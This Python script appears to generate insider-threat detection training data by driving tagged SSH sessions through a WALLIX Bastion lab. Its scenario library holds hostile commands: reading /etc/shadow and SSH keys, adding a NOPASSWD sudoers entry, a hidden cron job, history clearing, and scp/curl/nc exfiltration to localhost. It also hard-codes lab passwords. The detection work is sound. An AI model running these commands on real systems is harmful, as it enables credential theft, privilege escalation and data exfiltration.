#!/usr/bin/env python3
"""
simulate_sessions.py — drive real SSH sessions through the WALLIX Bastion
===========================================================================

Phase 1 of dataset generation (see claude.md §10): collect REAL template
sessions (6 attack types + benign) through the Bastion so extract.py can pull
them into events.jsonl/sessions.jsonl. These become templates.jsonl /
eval_real.jsonl inputs for generate_from_template.py — this script does not
do any synthesis itself.

WALLIX SSH login is two-password and interactive:
  paramiko auth (test-ssh / P@ssw@rd123) -> "Account successfully checked out"
  -> shell prompts "root's password:" -> typed into the channel (lab) -> shell.
sshpass/expect answer only one prompt each; paramiko's invoke_shell() lets us
watch the channel and answer the second prompt ourselves.

Every session is tagged: the first command is `echo TAG:<session_tag>` so the
tag shows up in KBD_INPUT telemetry and can be joined back to ground_truth.jsonl
after extract.py runs. All attack commands are self-cleaning / non-destructive
(create-then-delete, or read-only) — see claude.md §6 security note.

Usage
-----
  python simulate_sessions.py --list
  python simulate_sessions.py --attacks all --benign 10
  python simulate_sessions.py --attacks recon,privesc --benign 0
  python simulate_sessions.py --dry-run --attacks all --benign 3
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import sys
import time
import uuid
from datetime import datetime, timezone
from typing import List, Optional

try:
    import paramiko
except ImportError:
    print("[simulate] missing dependency: pip install paramiko", file=sys.stderr)
    raise

# ─────────────────────────── lab configuration ──────────────────────────────
BASTION_HOST   = os.environ.get("WALLIX_HOST", "192.168.1.50")
BASTION_PORT   = int(os.environ.get("WALLIX_SSH_PORT", "22"))
LOGIN_USER     = os.environ.get("WALLIX_LOGIN_USER", "test-ssh")
LOGIN_PASS     = os.environ.get("WALLIX_LOGIN_PASS", "P@ssw@rd123.")
TARGET_PASS    = os.environ.get("WALLIX_TARGET_PASS", "lab")
TARGET_HOST    = "debian-lab"

PROMPT_RE   = re.compile(r"[#$>][ ]?$")
PASSWORD_RE = re.compile(r"password:\s*$", re.IGNORECASE)
MENU_READY_RE = re.compile(r"ctrl-D to quit", re.IGNORECASE)
MENU_ROW_RE = re.compile(r"\|\s*(\d+)\s*\|\s*([\w.\-]+)@")
# A mid-command "password for X:" is sudo asking us for a password we don't
# have on the non-root persona accounts. That denial is itself a real
# insider-threat signal (failed privesc attempt), not a script failure --
# see run_session, which cancels it with Ctrl+C and keeps going.
SUDO_DENIED_RE = re.compile(r"password for [^:]+:\s*$", re.IGNORECASE)
STEP_TIMEOUT = 15  # seconds to wait for each expected prompt

# Real vaulted accounts on debian-lab (WALLIX selection menu):
#   p_admin    - root, the only account requiring a manual second password (lab)
#   p_dev/p_audit/p_dba - NOPASSWD sudoers, auto-connect (no second password)
#   bastionsvc - plain non-sudo test account, auto-connect
# Personas get their own real account (genuine per-persona command distributions,
# real role_command_mismatch signal). Attack scenarios default to p_admin, but
# can rotate through the NOPASSWD sudoer accounts too (--attack-accounts) --
# that's the actual insider-threat signal: a normal-role account doing
# privileged things it shouldn't. bastionsvc has no sudo, so it's excluded
# from ATTACK_CAPABLE_ACCOUNTS (root-only steps would just fail there).
PERSONA_ACCOUNTS = {"admin": "bastionsvc", "dba": "p_dba", "dev": "p_dev", "auditor": "p_audit"}
ATTACK_ACCOUNT = "p_admin"
ATTACK_CAPABLE_ACCOUNTS = ["p_admin", "p_dev", "p_dba", "p_audit"]

GROUND_TRUTH_PATH = os.path.join(os.path.dirname(__file__), "out", "ground_truth.jsonl")

# Curated external content (see curate_linux_commands.py / curate_atomic_redteam.py).
# Benign: mecha-org/linux-command-dataset, pre-filtered to exclude anything matching
# a wallix_rules.xml pattern. Attack: Atomic Red Team, pre-filtered for self-cleaning/
# non-destructive/no-TTY-hang -- still only 16 candidates survived across all 6
# scenarios (privesc/cred_access/exfil yielded none; ART assumes disposable VMs, not
# a shared lab -- see curate_atomic_redteam.py docstring). Both are optional: falls
# back to the hand-built defaults below if the curated files aren't present.
_COMMANDS_DIR = os.path.join(os.path.dirname(__file__), "commands_dataset")


def _load_json(path: str) -> dict:
    if not os.path.isfile(path):
        return {}
    with open(path, encoding="utf-8") as fh:
        return json.load(fh)


BENIGN_CURATED = _load_json(os.path.join(_COMMANDS_DIR, "persona_commands_curated.json"))
_ATTACK_CURATED_RAW = _load_json(os.path.join(_COMMANDS_DIR, "attack_commands_curated.json"))

# ─────────────────────────── scenario library ───────────────────────────────
# Rule IDs from claude.md §5. Every attack scenario is read-only or
# create-then-delete; exfil targets 127.0.0.1 so nothing leaves the lab.
ATTACK_SCENARIOS = {
    "recon": {
        "rule_ids": [100518],
        "mitre": ["T1082", "T1087"],
        "commands": [
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "cat /etc/os-release",
            "ps aux",
            "netstat -tulnp",
            "who",
            "last -n 5",
        ],
    },
    "cred_access": {
        "rule_ids": [100510],
        "mitre": ["T1003", "T1552"],
        "commands": [
            "{sudo}cat /etc/shadow",
            "{sudo}find /root /home /etc -name id_rsa 2>/dev/null",
            "cat ~/.ssh/authorized_keys 2>/dev/null",
            "find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null",
        ],
    },
    "privesc": {
        "rule_ids": [100512],
        "mitre": ["T1548", "T1136"],
        "commands": [
            "sudo -l",
            "{sudo}useradd -m tempuser_{tag}",
            "echo 'tempuser_{tag} ALL=(ALL) NOPASSWD:ALL' | {sudo}tee /etc/sudoers.d/tempuser_{tag} > /dev/null",
            "id tempuser_{tag}",
            "{sudo}rm -f /etc/sudoers.d/tempuser_{tag}",
            "{sudo}userdel -r tempuser_{tag}",
        ],
    },
    "persistence": {
        "rule_ids": [100514],
        "mitre": ["T1053", "T1098"],
        "commands": [
            "echo '#!/bin/bash' > /tmp/.cache_update_{tag}.sh",
            "(crontab -l 2>/dev/null; echo \"*/5 * * * * /tmp/.cache_update_{tag}.sh\") | crontab -",
            "crontab -l",
            "crontab -l | grep -v {tag} | crontab -",
            "rm -f /tmp/.cache_update_{tag}.sh",
        ],
    },
    "log_tamper": {
        "rule_ids": [100516],
        "mitre": ["T1070", "T1562"],
        "commands": [
            "{sudo}ls -la /var/log/",
            "{sudo}cat /var/log/auth.log 2>/dev/null | tail -20",
            "history -c",
            "last",
        ],
    },
    "exfil": {
        "rule_ids": [100520],
        "mitre": ["T1048", "T1041"],
        "commands": [
            "echo 'test-data-{tag}' > /tmp/exfil_test_{tag}.txt",
            "scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 "
            "/tmp/exfil_test_{tag}.txt root@127.0.0.1:/tmp/ 2>&1 | head -5",
            "curl -s -m 3 -X POST -F file=@/tmp/exfil_test_{tag}.txt http://127.0.0.1:9999/upload 2>&1 | head -3",
            "nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_{tag}.txt 2>&1",
            "rm -f /tmp/exfil_test_{tag}.txt",
        ],
    },
}

# Atomic Red Team variants per scenario, built from attack_commands_curated.json.
# Each variant is an alternative command list to the hand-built default above --
# picked randomly per session (see get_attack_commands) so repeated reps of the
# same scenario aren't always byte-identical. Multi-line command/cleanup blocks
# are split into individual lines (each is a complete, self-contained shell
# statement -- verified by inspection, no heredocs/multi-line control blocks)
# and typed one at a time, same as the hand-built commands.
ATTACK_VARIANTS: dict = {}
for _scenario, _tests in _ATTACK_CURATED_RAW.items():
    for _t in _tests:
        _lines = [l for l in _t["command"].splitlines() if l.strip()]
        if _t.get("cleanup_command"):
            _lines += [l for l in _t["cleanup_command"].splitlines() if l.strip()]
        ATTACK_VARIANTS.setdefault(_scenario, []).append({
            "technique": _t["technique"],
            "test_name": _t["test_name"],
            "commands": _lines,
        })

# Persona-based benign command pools (claude.md §10 personas: admin/dba/dev/auditor).
# This hand-built list is a small guaranteed CORE per persona (always included,
# read-only, known to run cleanly on debian-lab) -- see get_benign_commands()
# below for how it's combined with BENIGN_CURATED for per-session diversity.
BENIGN_PERSONAS_CORE = {
    "admin": [
        "ls -la", "df -h", "systemctl --no-pager status sshd", "uptime", "free -m", "who",
    ],
    "dba": [
        "ls -la /var/lib", "du -sh /var/log", "ps aux | grep -i sql", "cat /etc/hosts",
    ],
    "dev": [
        "cd /tmp && ls -la", "git status", "cat /etc/os-release", "python3 --version",
    ],
    "auditor": [
        "cat /etc/passwd", "ls -la /etc/", "w", "last -n 10", "uptime",
    ],
}
BENIGN_PERSONAS = BENIGN_PERSONAS_CORE  # back-compat alias (e.g. --list, persona name set)


def get_benign_commands(persona: str, extra: int = 4) -> list:
    """Core commands (always included) + up to `extra` random commands sampled
    from the curated public dataset (empty extra pool -> core only)."""
    core = list(BENIGN_PERSONAS_CORE[persona])
    pool = BENIGN_CURATED.get(persona, [])
    if pool:
        core += random.sample(pool, min(extra, len(pool)))
    return core


def get_attack_commands(scenario: str) -> tuple:
    """Randomly picks between the hand-built default and an available Atomic
    Red Team variant for this scenario. Returns (commands, variant_label)."""
    variants = ATTACK_VARIANTS.get(scenario, [])
    if variants and random.random() < 0.5:
        v = random.choice(variants)
        return v["commands"], f"art:{v['technique']}:{v['test_name']}"
    return list(ATTACK_SCENARIOS[scenario]["commands"]), "default"


# ─────────────────────────── SSH driver ─────────────────────────────────────
class SessionError(RuntimeError):
    pass


def _read_until(channel, pattern: re.Pattern, timeout: int = STEP_TIMEOUT) -> str:
    """Accumulate channel output until `pattern` matches the tail, or time out."""
    buf, _ = _read_until_any(channel, [pattern], timeout)
    return buf


def _read_until_any(channel, patterns: List[re.Pattern],
                     timeout: int = STEP_TIMEOUT) -> tuple:
    """Accumulate channel output until any pattern matches, or time out.
    Returns (buffer, index of the pattern that matched)."""
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if channel.recv_ready():
            chunk = channel.recv(4096).decode("utf-8", errors="replace")
            buf += chunk
            for i, pattern in enumerate(patterns):
                if pattern.search(buf):
                    return buf, i
        else:
            time.sleep(0.1)
    pat_desc = " | ".join(p.pattern for p in patterns)
    raise SessionError(f"timed out waiting for [{pat_desc}]; buffer so far:\n{buf}")


def _send(channel, line: str) -> None:
    channel.send(line + "\n")


def _select_account(channel, account: str) -> None:
    """Parse the WALLIX account-selection menu and pick the row matching `account`."""
    buf = _read_until(channel, MENU_READY_RE)
    by_name = {name: idx for idx, name in MENU_ROW_RE.findall(buf)}  # account name -> row id
    if account not in by_name:
        raise SessionError(f"account {account!r} not found in WALLIX menu; saw: {by_name}")
    _send(channel, by_name[account])


def run_session(scenario_name: str, commands: List[str], session_tag: str, account: str,
                 pacing: tuple = (0.4, 1.3), dry_run: bool = False,
                 verbose: bool = False) -> None:
    # p_admin is already root; sudo would be redundant (but harmless). Every
    # other account is a NOPASSWD sudoer, so "sudo " unlocks the same
    # root-only steps (reading /etc/shadow, useradd, sudoers, auth.log).
    sudo_prefix = "" if account == ATTACK_ACCOUNT else "sudo "
    # Literal replace, not str.format(): curated content (ART/public dataset)
    # isn't guaranteed free of stray { } (e.g. shell brace expansion), which
    # would otherwise raise inside .format().
    resolved = [c.replace("{tag}", session_tag).replace("{sudo}", sudo_prefix)
                for c in commands]

    if dry_run:
        print(f"[dry-run] {scenario_name} tag={session_tag} account={account}")
        for c in resolved:
            print(f"    {c}")
        return {"commands_sent": resolved, "commands_denied": []}

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(BASTION_HOST, port=BASTION_PORT, username=LOGIN_USER,
                   password=LOGIN_PASS, look_for_keys=False, allow_agent=False,
                   timeout=STEP_TIMEOUT)
    channel = client.invoke_shell()
    try:
        # Post-auth, WALLIX shows an account-selection menu (table of ID | Site |
        # Authorization). Pick the row for `account` by ID.
        _select_account(channel, account)

        # Only p_admin (root) requires a manual second password; the NOPASSWD
        # sudoers accounts (p_dev/p_audit/p_dba) and bastionsvc auto-connect.
        if account == ATTACK_ACCOUNT:
            _read_until(channel, PASSWORD_RE)
            _send(channel, TARGET_PASS)
        _read_until(channel, PROMPT_RE)

        _send(channel, f"echo TAG:{session_tag}")
        _read_until(channel, PROMPT_RE)

        denied = []
        for cmd in resolved:
            if verbose:
                print(f"    -> {cmd}")
            _send(channel, cmd)
            time.sleep(random.uniform(*pacing))
            _, idx = _read_until_any(channel, [PROMPT_RE, SUDO_DENIED_RE])
            if idx == 1:
                # No password for this account -- cancel the prompt and move on.
                # The denial itself is real telemetry (failed privesc attempt).
                if verbose:
                    print(f"       (denied: no password for {account})")
                denied.append(cmd)
                channel.send("\x03")
                _read_until(channel, PROMPT_RE)

        _send(channel, "exit")
        time.sleep(0.5)
        return {"commands_sent": resolved, "commands_denied": denied}
    finally:
        client.close()


# ─────────────────────────── ground truth ───────────────────────────────────
def append_ground_truth(record: dict) -> None:
    os.makedirs(os.path.dirname(GROUND_TRUTH_PATH), exist_ok=True)
    with open(GROUND_TRUTH_PATH, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(record, ensure_ascii=False) + "\n")


def make_tag(kind: str, name: str) -> str:
    # kept short: it gets embedded in usernames/filenames on the target
    # (useradd caps at 32 chars), e.g. "atk_privesc_a3f9c1"
    kind_code = "atk" if kind == "attack" else "ben"
    return f"{kind_code}_{name}_{uuid.uuid4().hex[:6]}"


# ─────────────────────────── main ───────────────────────────────────────────
def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(description="Drive real SSH sessions through WALLIX for dataset templates")
    p.add_argument("--attacks", default="all",
                    help="comma-separated attack scenario names, or 'all' or 'none' "
                         f"(available: {','.join(ATTACK_SCENARIOS)})")
    p.add_argument("--benign", type=int, default=10, help="number of benign sessions to run")
    p.add_argument("--repeat", type=int, default=1, help="repeat each attack scenario N times")
    p.add_argument("--attack-accounts", default="p_admin",
                    help="comma-separated accounts to rotate attack sessions through "
                         f"(available: {','.join(ATTACK_CAPABLE_ACCOUNTS)}). Accounts other "
                         "than p_admin are NOPASSWD sudoers -- root-only steps get a 'sudo ' "
                         "prefix automatically. This is the real insider-threat signal: a "
                         "normal-role account doing privileged things it shouldn't.")
    p.add_argument("--dry-run", action="store_true", help="print commands, don't connect")
    p.add_argument("--verbose", action="store_true", help="print each command as it's sent")
    p.add_argument("--list", action="store_true", help="list scenarios and exit")
    args = p.parse_args(argv)

    if args.list:
        print("Attack scenarios:")
        for name, spec in ATTACK_SCENARIOS.items():
            print(f"  {name:12s} rule_ids={spec['rule_ids']} mitre={spec['mitre']}")
        print("Benign personas:", ", ".join(BENIGN_PERSONAS))
        return 0

    if args.attacks == "all":
        attack_names = list(ATTACK_SCENARIOS)
    elif args.attacks == "none":
        attack_names = []
    else:
        attack_names = [a.strip() for a in args.attacks.split(",") if a.strip()]
        unknown = set(attack_names) - set(ATTACK_SCENARIOS)
        if unknown:
            print(f"[simulate] unknown scenario(s): {unknown}", file=sys.stderr)
            return 1

    attack_accounts = [a.strip() for a in args.attack_accounts.split(",") if a.strip()]
    unknown_acc = set(attack_accounts) - set(ATTACK_CAPABLE_ACCOUNTS)
    if unknown_acc:
        print(f"[simulate] unknown attack account(s): {unknown_acc} "
              f"(available: {ATTACK_CAPABLE_ACCOUNTS})", file=sys.stderr)
        return 1

    plan = []
    acc_i = 0
    for name in attack_names:
        for _ in range(args.repeat):
            plan.append(("attack", name, attack_accounts[acc_i % len(attack_accounts)]))
            acc_i += 1
    personas = list(BENIGN_PERSONAS)
    for i in range(args.benign):
        persona = personas[i % len(personas)]
        plan.append(("benign", persona, PERSONA_ACCOUNTS[persona]))
    random.shuffle(plan)

    print(f"[simulate] plan: {len(plan)} sessions "
          f"({len(attack_names)} attack types x{args.repeat} across {attack_accounts}, "
          f"{args.benign} benign)", file=sys.stderr)

    for kind, name, account in plan:
        tag = make_tag(kind, name)
        started = datetime.now(timezone.utc).isoformat()

        if kind == "attack":
            spec = ATTACK_SCENARIOS[name]
            commands, variant = get_attack_commands(name)
            rule_ids = spec["rule_ids"]
            mitre = spec["mitre"]
        else:
            spec = None
            commands = get_benign_commands(name)
            variant = "core+curated"
            rule_ids = []
            mitre = []

        print(f"[simulate] running {kind}:{name} tag={tag} account={account}", file=sys.stderr)
        commands_denied: List[str] = []
        commands_sent: List[str] = []
        try:
            result = run_session(name, commands, tag, account,
                                  dry_run=args.dry_run, verbose=args.verbose)
            if result:
                commands_sent = result["commands_sent"]
                commands_denied = result["commands_denied"]
            status = "ok"
            error = None
        except (SessionError, paramiko.SSHException, OSError) as e:
            # Includes paramiko auth/connect failures (e.g. a transient auth
            # blip or lockout) -- one bad session shouldn't kill the whole batch.
            status = "error"
            error = str(e)
            print(f"[simulate] session {tag} FAILED: {e}", file=sys.stderr)

        if not args.dry_run:
            fail_ratio = (len(commands_denied) / len(commands_sent)) if commands_sent else 0.0
            append_ground_truth({
                "session_tag": tag,
                "kind": kind,               # "attack" | "benign"
                "scenario": name,           # attack type or persona
                "variant": variant,         # "default" | "art:<technique>:<test_name>" | "core+curated"
                "expected_rule_ids": rule_ids,
                "mitre": mitre,
                "target_hostname": TARGET_HOST,
                "account": account,
                "protocol": "SSH",
                "started_at": started,
                "status": status,
                "error": error,
                "commands_denied": commands_denied,  # sudo-denied on this account (no password)
                "fail_ratio": round(fail_ratio, 3),
            })

        if not args.dry_run:
            time.sleep(random.uniform(1.0, 3.0))

    if not args.dry_run:
        print(f"[simulate] ground truth -> {GROUND_TRUTH_PATH}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
